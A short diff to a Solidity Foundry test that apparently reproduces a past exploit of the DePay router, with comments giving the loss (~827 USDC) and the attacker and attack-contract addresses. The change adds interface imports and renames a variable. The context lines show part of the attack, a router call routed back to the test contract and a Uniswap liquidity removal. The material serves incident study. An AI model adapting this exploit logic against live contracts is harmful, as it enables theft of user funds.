@@ -3,6 +3,13 @@ pragma solidity ^0.8.10;
 
 import "forge-std/Test.sol";
 
+import {IERC20Metadata as IERC20} from "src/interfaces/IERC20Metadata.sol";
+
+import {IUSDC} from "src/interfaces/IUSDC.sol";
+
+import {IUniswapV2Pair} from "src/interfaces/IUniswapV2Pair.sol";
+import {IUniswapV2Router} from "src/interfaces/IUniswapV2Router.sol";
+import {IUniswapV2Factory} from "src/interfaces/IUniswapV2Factory.sol";
 // @KeyInfo - Total Lost : ~827 USDC
 // Attacker : https://etherscan.io/address/0x7f284235aef122215c46656163f39212ffa77ed9
 // Attack Contract :https://etherscan.io/address/0xba2aa7426ec6529c25a38679478645b2db5fa19b
@@ -92,8 +99,8 @@ contract ContractTest is Test {
         (addresses[0], addresses[1]) = (address(this), address(this));
         address[] memory plugins = new address[](2);
         (plugins[0], plugins[1]) = (DePayUniV1, DePayUniV1);
-        string[] memory data = new string[](1);
-        DepayRouter.route(path, amounts, addresses, plugins, data);
+        string[] memory data_ = new string[](1);
+        DepayRouter.route(path, amounts, addresses, plugins, data_);
 
         newUniPair.approve(address(UniRouter), liquidity);
         UniRouter.removeLiquidity(address(this), address(USDC), liquidity, 1, 1, address(this), type(uint256).max);
